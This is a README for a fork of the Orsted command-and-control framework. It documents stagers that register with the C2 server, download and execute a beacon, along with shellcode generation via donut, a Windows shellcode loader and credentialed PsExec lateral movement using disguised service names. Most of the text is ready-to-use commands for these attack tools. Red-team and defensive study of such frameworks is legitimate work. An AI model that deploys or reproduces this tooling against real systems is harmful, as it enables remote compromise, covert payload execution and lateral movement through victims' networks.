# Orsted C2 — Feature Fork

![Orsted](orsted-homepage.png)

> **"They live as they please with that tiny pride of theirs and die because of a foolish enemy."**  

This is a fork of the original [Orsted C2](https://github.com/almounah/orsted) framework, focused on implementing missing features and fixes. The original project provides the core C2 architecture — this repo extends it with stager delivery, shellcode generation, and related improvements.

**Original repo:** [github.com/almounah/orsted](https://github.com/almounah/orsted)  
**Original docs:** [almounah.github.io/orsted-doc](https://almounah.github.io/orsted-doc/)

---

## Features Added in This Fork

### Two-Stage Stager Delivery

Generate minimal stagers (~50KB) that register with the C2 server, download the full beacon agent, and execute it. Supports both 32-bit and 64-bit Windows targets over HTTP and HTTPS.

**Generate a stager:**
```bash
# 64-bit HTTP stager
generate stager windows http 192.168.1.10:8080

# 32-bit HTTP stager
generate stager windows http 192.168.1.10:8080 -r 32

# 64-bit HTTPS stager
generate stager windows https 192.168.1.10:443

# 32-bit HTTPS stager with proxy
generate stager windows https 192.168.1.10:443 -r 32 -t https -a 127.0.0.1:8080
```

**Options:**
| Flag | Description | Default |
|------|-------------|---------|
| `-r, --arch` | Target architecture (`32` or `64`) | `64` |
| `-t, --http-proxy-type` | Proxy type (`http`, `https`) | `none` |
| `-a, --http-proxy-address` | Proxy address (`IP:PORT`) | — |
| `-u, --http-proxy-username` | Proxy username | — |
| `-p, --http-proxy-password` | Proxy password | — |

**Output files:**
- `stager_http_64.exe` — Windows x64 HTTP stager
- `stager_http_32.exe` — Windows x86 HTTP stager
- `stager_https_64.exe` — Windows x64 HTTPS stager
- `stager_https_32.exe` — Windows x86 HTTPS stager

**How it works:**
1. Stager registers with C2 server (same protocol as full beacon)
2. Constructs download URL from server address + beacon ID
3. Downloads full beacon binary from `/agent/download/{beacon_id}`
4. Validates PE header (MZ magic bytes)
5. Writes to temp file and executes via `os.StartProcess`
6. Stager exits, beacon continues running

**Server setup:** The stager downloads the full beacon from `/agent/download/{beacon_id}` on the server. The server checks the hosted files DB first, then falls back to the local `beacons/` directory.

```bash
# Option A: Host via the client (recommended)
# 1. Generate the beacon
generate beacon windows http 192.168.1.10:8080

# 2. Host it on the server from the client menu
hoster host ./main_http_64.exe main_http_64.exe

# 3. Verify it's hosted
hoster view

# Option B: Copy to filesystem manually
# 1. Generate the beacon
generate beacon windows http 192.168.1.10:8080

# 2. Copy to the server's beacons/ directory
mkdir -p beacons
cp main_http_64.exe beacons/main_http_64.exe
# For 32-bit: cp main_http_32.exe beacons/main_http_32.exe
```

If the beacon file is missing from both the hosted files and `beacons/`, the stager will get a `404 Not Found`.

---

### Shellcode Generation

Convert any PE binary (stager or beacon) into position-independent shellcode using [donut](https://github.com/TheWover/donut). Supports multiple output formats for different injection scenarios.

**Usage:**
```bash
# Base64 output (default)
generate shellcode stager_http_64.exe

# Raw binary
generate shellcode stager_http_64.exe -f raw -o payload.bin

# C# byte array
generate shellcode stager_http_64.exe -f csharp -o payload.cs

# VBA array
generate shellcode stager_http_64.exe -f vba -o payload.vba

# JavaScript array
generate shellcode stager_http_64.exe -f javascript -o payload.js

# Hex string
generate shellcode stager_http_64.exe -f hex -o payload.hex
```

**Supported formats:** `base64`, `hex`, `raw`, `vba`, `csharp`, `javascript`

Works with both 32-bit and 64-bit PE files. The donut tool must be present at `tools/donut`.

---

### Shellcode Loader (Test Tool)

A standalone shellcode loader for testing donut-generated shellcode on Windows targets. No CGO, no external dependencies — pure Go with syscalls.

**Compile:**
```bash
# 64-bit
GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-s -w" -o loader.exe tools/shellcode-loader/loader.go

# 32-bit
GOOS=windows GOARCH=386 CGO_ENABLED=0 go build -ldflags="-s -w" -o loader_32.exe tools/shellcode-loader/loader.go
```

**Usage:**
```bash
# Generate shellcode (from client or standalone donut)
generate shellcode main_http_64.exe -f raw -o shellcode.bin
# or: ./tools/donut -i main_http_64.exe -o shellcode.bin

# Run on target
loader.exe shellcode.bin              # raw bytes (default)
loader.exe shellcode.b64 base64       # base64 encoded
loader.exe shellcode.hex hex          # hex encoded
```

**Important: format must match between generation and loading.** `generate shellcode` defaults to base64, but `loader.exe` defaults to raw. Either generate as raw (`-f raw`) or tell the loader the format (`loader.exe file.b64 base64`). Mismatched formats will silently fail — the shellcode executes but the beacon won't call back.

**How it works:** VirtualAlloc (RW) → RtlMoveMemory → VirtualProtect (RX) → CreateThread → WaitForSingleObject.

---

### PsExec with Credentials

The psexec command now supports explicit credential authentication for lateral movement. Authenticate to a remote host with username/password instead of relying on the beacon's current token.

**Usage:**
```bash
# With credentials
psexec -u administrator -p Password123 -D CORP dc01 beacon_svc.exe

# Without credentials (unchanged — uses current token)
psexec dc01 beacon_svc.exe
```

**Options:**
| Flag | Description | Default |
|------|-------------|---------|
| `-u, --username` | Username for remote authentication | — |
| `-p, --password` | Password for remote authentication | — |
| `-D, --domain` | Domain for remote authentication | — |
| `-s, --servicename` | Service name (no spaces) | `auditorsvc` |
| `-d, --servicedesc` | Service description (no spaces) | `Service_used_to_audit...` |
| `-b, --binpath` | Remote binary path | `C:\Windows\performance_audit.exe` |

**How it works:**
1. Establishes authenticated SMB session via `WNetAddConnection2W` to `\\host\IPC$`
2. Uploads service binary to remote host via UNC path (uses authenticated session)
3. Creates and starts remote Windows service via SCM (uses authenticated session)
4. Cleans up SMB session via `WNetCancelConnection2W` after service starts

**Prerequisites:** Load the psexec module first: `load-module psexec`

---

### Bug Fixes

- Fixed `grumble.Commands` iteration error (struct is not iterable — use `.Get()`)
- Fixed missing `os` import in server download handler
- Fixed `os.StartProcess` return value handling
- Fixed stager dying instantly (removed premature temp file deletion)
- Fixed false success message on stager build failure

---

## Building for Older GLIBC/Legacy Systems

If your target systems have older GLIBC versions (< 2.32), beacons built on modern systems will fail with:
```
./main_http: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32' not found
```

**Solution: Build inside a Docker container with matching GLIBC version.**

```bash
# Create builder
docker build -f Dockerfile.build -t orsted-builder:legacy .

# Run with volume mounts
docker run -it --rm \
  -v $(pwd):/data/orsted \
  -v $(pwd)/beacons:/data/output \
  orsted-builder:legacy
```

**GLIBC versions by Ubuntu:**
- Ubuntu 20.04 → GLIBC 2.31
- Ubuntu 18.04 → GLIBC 2.27
- Ubuntu 16.04 → GLIBC 2.23

---

## Original Documentation

For the core Orsted architecture, setup, and usage:

- **Original repo:** [github.com/almounah/orsted](https://github.com/almounah/orsted)
- **Documentation site:** [almounah.github.io/orsted-doc](https://almounah.github.io/orsted-doc/)
- **Example usage:** [Orsted in Action](https://almounah.github.io/orsted-doc/intro/4-example-usage/)

![Orsted](orsted.gif)
